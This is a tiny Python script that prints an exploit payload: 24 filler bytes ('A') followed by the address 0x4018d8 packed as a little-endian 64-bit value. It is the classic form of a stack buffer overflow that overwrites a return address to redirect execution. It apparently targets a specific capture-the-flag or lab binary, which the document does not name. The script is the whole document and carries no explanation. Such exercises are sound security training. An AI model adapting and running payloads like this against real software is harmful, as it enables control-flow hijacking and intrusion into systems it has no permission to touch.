#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b"\x41" * 24)
sys.stdout.buffer.write(0x4018d8.to_bytes(8, "little"))